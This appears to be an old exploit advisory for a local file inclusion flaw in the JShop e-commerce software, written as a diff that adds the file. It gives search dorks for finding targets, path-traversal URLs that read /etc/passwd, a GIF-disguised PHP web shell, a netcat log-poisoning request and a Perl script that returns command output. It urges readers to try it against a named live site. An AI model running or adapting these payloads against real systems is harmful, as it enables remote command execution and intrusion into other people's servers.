@@ -1,0 +1,57 @@
+JShop 1.x-2.x local file include
+---------------------------------------------------------------------------------------------------------------------
++ scripts:	Jshop Server 1.x-2.x                                                                                +
++ Discovered By :	v0l4arrra <v0l4arrr[at]gmail[dot]com>                                                       +
++ url:	 www.jshop.co.uk                                                                                            +
++ dork:	"powered by jshop" and also usefull one "allinurl:jssCart=.."                                               +
+---------------------------------------------------------------------------------------------------------------------
+Go to www.jshop.co.uk and check out demo version...
+
+http://www.jshopecommerce.com/v2demo/page.php?xPage=../../../../../../../../../../../../../etc/passwd%00
+
+Then u can upload for example the gif file like this 
+
+$cat 1.gif
+GIF89aD
+<?php echo system($_GET['cmd']); ?>
+
+or do it like me:
+$nc www.jshopecommerce.com 80
+GET <?php echo '<start>'; echo system($_GET['cmd']); echo '</start>'; ?> HTTP/1.1
+Host: www.jshopecommerce.com
+
+................................................................................................................
+and simple parse the output of error log with lame perl script:
+
+#!/usr/bin/env perl
+use strict; use warnings;
+
+#####################################
+# This script download log file     #
+# and grep the result of the        #
+# command in tags <start>..</start> #
+# and print it..                    #
+#####################################
+
+use LWP::UserAgent;
+use HTTP::Request::Common;
+
+$| = 1;
+
+my $url = $ARGV[0] or print "usage: $0 http://127.0.0.1/vuln.php?page=../../../../../var/log/access.log%00&cmd=ls+-lisa\n" and exit;
+my $ua= new LWP::UserAgent;
+$ua->agent("Mozilla/5.0");
+my $request = new HTTP::Request( 'GET' => $url );
+my $document = $ua->request($request);
+my $response = $document->as_string;
+$response =~ m%<start>(.*?)</start>%is;
+print $1,"\n";
+
+######################################
+
+so dont waste your time and check it now
+http://www.jshopecommerce.com/v2demo/page.php?xPage=../../../../../../../../../../etc/httpd/logs/error_log%00&cmd=ls+-lisa
+
+##########################################
+
+# milw0rm.com [2008-03-30]
